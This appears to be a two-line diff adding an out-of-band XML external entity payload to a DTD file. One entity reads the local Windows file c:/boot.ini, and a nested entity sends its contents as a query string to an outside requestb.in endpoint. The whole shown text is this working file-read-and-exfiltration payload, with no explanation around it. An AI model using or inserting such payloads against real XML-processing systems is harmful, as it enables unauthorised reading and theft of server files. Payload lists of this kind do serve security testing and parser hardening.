@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/boot.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://requestb.in/yi8w3ayi?%data;'>">
